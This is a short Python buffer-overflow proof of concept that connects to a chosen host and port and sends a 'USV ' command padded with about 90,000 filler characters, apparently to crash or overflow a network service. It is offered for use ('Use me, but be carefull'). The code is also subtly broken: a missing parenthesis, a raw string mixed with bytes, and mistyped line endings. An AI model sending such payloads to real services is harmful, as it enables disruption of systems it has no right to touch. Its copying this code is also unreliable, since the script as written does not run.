#!/usr/bin/env python3

import argparse
import socket
import sys


def sender(host, port):
    try:
        buffer = r"\x41" * 90000
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port)
        s.send(b"USV " + buffer + b"//r//n//r")
        s.close()
        print("BUFFER_EXPLOIT enviado com sucesso!\n")
    except KeyboardInterrupt:
        print('Exiting...\n')

if __name__ == '__main__':
    carg = argparse.ArgumentParser(description='Buffer overflow, I found it in a magazine',
                                   epilog='Use me, but be carefull')

    carg.add_argument('-d', '--host', type=str, help='Host to send the buffer', required=True)
    carg.add_argument('-p', '--port', type=int, help='Port to send the buffer', required=True)
    args = carg.parse_args()

    host_ip = args.host
    host_port = args.port

    sender(host_ip, host_port)
    sys.exit(0)